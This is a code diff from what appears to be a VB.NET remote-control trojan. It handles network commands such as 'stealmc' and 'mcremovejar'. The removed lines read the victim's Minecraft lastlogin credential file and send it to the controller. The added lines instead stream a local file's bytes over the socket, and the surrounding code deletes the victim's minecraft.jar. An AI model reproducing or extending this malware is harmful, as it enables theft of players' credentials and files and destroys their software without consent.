@@ -44,19 +44,26 @@ Public Class Form1
                         ElseIf s = "stealmc" Then
                             Threading.Thread.Sleep(500)
                             Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
-                            Dim lastlogindata As String
-                            If System.IO.File.Exists(lastlogin) = True Then
-                                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
-                                    Dim value As Integer = file.ReadByte()
-                                    Do Until value = -1
-                                        lastlogindata = lastlogindata & value.ToString("X2")
-
-                                        value = file.ReadByte()
-                                    Loop
-                                End Using
-                            End If
-                            w.WriteLine(lastlogindata)
-                            w.Flush()
+                            'Dim lastlogindata As String
+                            'If System.IO.File.Exists(lastlogin) = True Then
+                            'Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
+                            'Dim value As Integer = File.ReadByte()
+                            ' Do Until value = -1
+                            'lastlogindata = lastlogindata & value.ToString("X2")
+                            '
+                            'value = File.ReadByte()
+                            ' Loop
+                            'End Using
+                            'End If
+                            'w.WriteLine(lastlogindata)
+                            'w.Flush()
+                            Dim networkStream As NetworkStream
+                            networkStream = client.GetStream()
+                            Dim fs As FileStream
+                            fs = New FileStream("D:\Users\Peter\AppData\Roaming\Untitled.png", FileMode.Open)
+                            Dim objReader As New BinaryReader(fs)
+                            Dim send() As Byte = objReader.ReadBytes(fs.Length)
+                            networkStream.Write(send, 0, send.Length)
                         ElseIf s = "mcremovejar" Then
                             Try
                                 Kill(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\bin\minecraft.jar")
